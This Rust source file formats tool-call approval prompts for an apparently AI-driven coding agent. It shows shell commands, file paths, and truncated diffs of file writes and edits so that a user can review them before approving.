/// Ask detail: a human-readable call summary (full command for shell, path for
/// file tools, compact JSON fallback), truncated by character count.
/// File-write tools render the affected lines (`-` old, `+` new) so the
/// user approves visible content, not a bare path.
fn ask_detail(tool: &str, input: &serde_json::Value) -> String {
    let detail = match tool {
        "write" => write_detail(input),
        "edit" => edit_detail(input),
        _ => {
            let target = input
                .get("command")
                .or_else(|| input.get("path"))
                .and_then(serde_json::Value::as_str)
                .map(str::to_owned)
                .unwrap_or_else(|| input.to_string());
            format!("{tool}: {target}")
        }
    };
    if detail.chars().count() <= DETAIL_MAX_CHARS {
        detail
    } else {
        let mut t: String = detail.chars().take(DETAIL_MAX_CHARS - 1).collect();
        t.push('…');
        t
    }
}

/// Display budget for file-write approvals (head line + diff rows),
/// before the hard character cap.
const DETAIL_DIFF_LINES: usize = 24;

/// Push `lines` under a `sign` prefix up to `budget` rows; hidden
/// remainder is summarized instead of dropped silently.
fn diff_lines_into(out: &mut Vec<String>, lines: &[&str], sign: char, budget: usize) {
    let shown = lines.len().min(budget);
    for line in &lines[..shown] {
        out.push(format!("{sign}{line}"));
    }
    if lines.len() > shown {
        out.push(format!("… ({sign}{} more lines)", lines.len() - shown));
    }
}

fn write_detail(input: &serde_json::Value) -> String {
    let path = input
        .get("path")
        .and_then(serde_json::Value::as_str)
        .unwrap_or("?");
    let content = input
        .get("content")
        .and_then(serde_json::Value::as_str)
        .unwrap_or_default();
    let mut out = vec![format!("write: {path}")];
    let content_lines: Vec<&str> = content.lines().collect();
    diff_lines_into(&mut out, &content_lines, '+', DETAIL_DIFF_LINES - 1);
    out.join("\n")
}

fn edit_detail(input: &serde_json::Value) -> String {
    let path = input
        .get("path")
        .and_then(serde_json::Value::as_str)
        .unwrap_or("?");
    let old = input
        .get("old_string")
        .and_then(serde_json::Value::as_str)
        .unwrap_or_default();
    let new = input
        .get("new_string")
        .and_then(serde_json::Value::as_str)
        .unwrap_or_default();
    let mut out = vec![format!("edit: {path}")];
    // Split the budget so both sides stay visible on large edits.
    let budget = DETAIL_DIFF_LINES - 1;
    let half = (budget / 2).max(1);
    let old_lines: Vec<&str> = old.lines().collect();
    let new_lines: Vec<&str> = new.lines().collect();
    diff_lines_into(&mut out, &old_lines, '-', half);
    let used = out.len() - 1;
    diff_lines_into(&mut out, &new_lines, '+', budget - used);
    out.join("\n")
}

#[cfg(test)]
mod lib_tests;
